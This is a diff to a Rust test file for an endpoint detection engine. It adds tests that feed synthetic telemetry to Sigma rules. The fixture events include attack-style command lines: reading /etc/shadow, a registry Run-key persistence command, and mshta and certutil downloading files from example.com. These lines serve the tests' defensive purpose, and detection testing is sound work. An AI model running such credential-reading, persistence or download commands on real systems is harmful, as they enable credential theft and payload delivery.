@@ -1,12 +1,16 @@
 use std::path::{Path, PathBuf};
 
-use detection::DetectionEngine;
+use detection::{DetectionEngine, EventClass, TelemetryEvent};
 use grpc_client::{pb, Client};
 
 fn workspace_root() -> PathBuf {
     PathBuf::from(env!("CARGO_MANIFEST_DIR"))
         .join("..")
         .join("..")
+}
+
+fn repo_rule(rule_path: &str) -> String {
+    std::fs::read_to_string(workspace_root().join(rule_path)).expect("read repo rule")
 }
 
 fn read(rel: &str) -> String {
@@ -676,4 +680,181 @@ fn update_script_executes_deb_and_rpm_paths_with_mocked_installers() {
     assert!(has_line(&workflow_lines, "echo \"sync yum repository\""));
 
     let _ = std::fs::remove_dir_all(&sandbox);
+}
+
+#[test]
+fn repo_credential_access_rule_ignores_passwd_and_sudoers_noise_but_keeps_shadow_hits() {
+    let mut engine = DetectionEngine::default_with_rules();
+    engine
+        .load_sigma_rule_yaml(&repo_rule("rules/sigma/credential_access.yml"))
+        .expect("compile repo credential access rule");
+
+    let mk_event = |path: &str, process: &str| TelemetryEvent {
+        ts_unix: 1_700_000_000,
+        event_class: EventClass::FileOpen,
+        pid: 4242,
+        ppid: 1,
+        uid: 1000,
+        process: process.to_string(),
+        parent_process: "bash".to_string(),
+        session_id: 4242,
+        file_path: Some(path.to_string()),
+        file_write: false,
+        file_hash: None,
+        dst_port: None,
+        dst_ip: None,
+        dst_domain: None,
+        command_line: Some(process.to_string()),
+        event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
+    };
+
+    let passwd = engine.process_event(&mk_event("/etc/passwd", "sudo"));
+    assert!(
+        !passwd
+            .temporal_hits
+            .iter()
+            .any(|hit| hit == "sigma_credential_access"),
+        "/etc/passwd should not trigger the repo credential-access sigma rule"
+    );
+
+    let sudoers = engine.process_event(&mk_event("/etc/sudoers", "sudo"));
+    assert!(
+        !sudoers
+            .temporal_hits
+            .iter()
+            .any(|hit| hit == "sigma_credential_access"),
+        "/etc/sudoers should not trigger the repo credential-access sigma rule"
+    );
+
+    let shadow = engine.process_event(&mk_event("/etc/shadow", "cat"));
+    assert!(
+        shadow
+            .temporal_hits
+            .iter()
+            .any(|hit| hit == "sigma_credential_access"),
+        "/etc/shadow must still trigger the repo credential-access sigma rule"
+    );
+}
+
+#[test]
+fn repo_windows_runkey_rule_matches_cmd_wrapper_shape() {
+    let mut engine = DetectionEngine::default_with_rules();
+    engine
+        .load_sigma_rule_yaml(&repo_rule(
+            "rules/sigma/windows_registry_runkey_persistence.yml",
+        ))
+        .expect("compile repo windows runkey rule");
+
+    let event = TelemetryEvent {
+        ts_unix: 1_700_000_000,
+        event_class: EventClass::ProcessExec,
+        pid: 7331,
+        ppid: 1,
+        uid: 0,
+        process: "cmd.exe".to_string(),
+        parent_process: "powershell.exe".to_string(),
+        session_id: 7331,
+        file_path: None,
+        file_write: false,
+        file_hash: None,
+        dst_port: None,
+        dst_ip: None,
+        dst_domain: None,
+        command_line: Some("cmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v EguardProof /t REG_SZ /d \"cmd.exe /c echo proof\" /f".to_string()),
+        event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
+    };
+
+    let out = engine.process_event(&event);
+    assert!(
+        out.temporal_hits
+            .iter()
+            .any(|hit| hit == "windows_registry_runkey_persistence"),
+        "cmd.exe wrapper around reg add run-key persistence must match the repo sigma rule"
+    );
+}
+
+#[test]
+fn repo_windows_mshta_rule_matches_live_https_shape() {
+    let mut engine = DetectionEngine::default_with_rules();
+    engine
+        .load_sigma_rule_yaml(&repo_rule("rules/sigma/windows_mshta_lolbin_download.yml"))
+        .expect("compile repo windows mshta rule");
+
+    let event = TelemetryEvent {
+        ts_unix: 1_700_000_000,
+        event_class: EventClass::ProcessExec,
+        pid: 7441,
+        ppid: 1,
+        uid: 0,
+        process: "mshta.exe".to_string(),
+        parent_process: "cmd.exe".to_string(),
+        session_id: 7441,
+        file_path: None,
+        file_write: false,
+        file_hash: None,
+        dst_port: None,
+        dst_ip: None,
+        dst_domain: None,
+        command_line: Some("mshta.exe  https://example.com/eguard-mshta-proof.hta".to_string()),
+        event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
+    };
+
+    let out = engine.process_event(&event);
+    assert!(
+        out.temporal_hits
+            .iter()
+            .any(|hit| hit == "windows_mshta_lolbin_download"),
+        "live mshta https wrapper shape must match the repo sigma rule"
+    );
+}
+
+#[test]
+fn repo_windows_certutil_rule_matches_live_urlcache_shape() {
+    let mut engine = DetectionEngine::default_with_rules();
+    engine
+        .load_sigma_rule_yaml(&repo_rule("rules/sigma/windows_certutil_download.yml"))
+        .expect("compile repo windows certutil rule");
+
+    let event = TelemetryEvent {
+        ts_unix: 1_700_000_000,
+        event_class: EventClass::ProcessExec,
+        pid: 7551,
+        ppid: 1,
+        uid: 0,
+        process: "certutil.exe".to_string(),
+        parent_process: "cmd.exe".to_string(),
+        session_id: 7551,
+        file_path: None,
+        file_write: false,
+        file_hash: None,
+        dst_port: None,
+        dst_ip: None,
+        dst_domain: None,
+        command_line: Some("certutil.exe -urlcache -split -f https://example.com/eguard-certutil-proof.bin C:\\Windows\\Temp\\eguard-certutil-proof.bin".to_string()),
+        event_size: None,
+        container_runtime: None,
+        container_id: None,
+        container_escape: false,
+        container_privileged: false,
+    };
+
+    let out = engine.process_event(&event);
+    assert!(
+        out.temporal_hits
+            .iter()
+            .any(|hit| hit == "windows_certutil_download"),
+        "live certutil urlcache wrapper shape must match the repo sigma rule"
+    );
 }
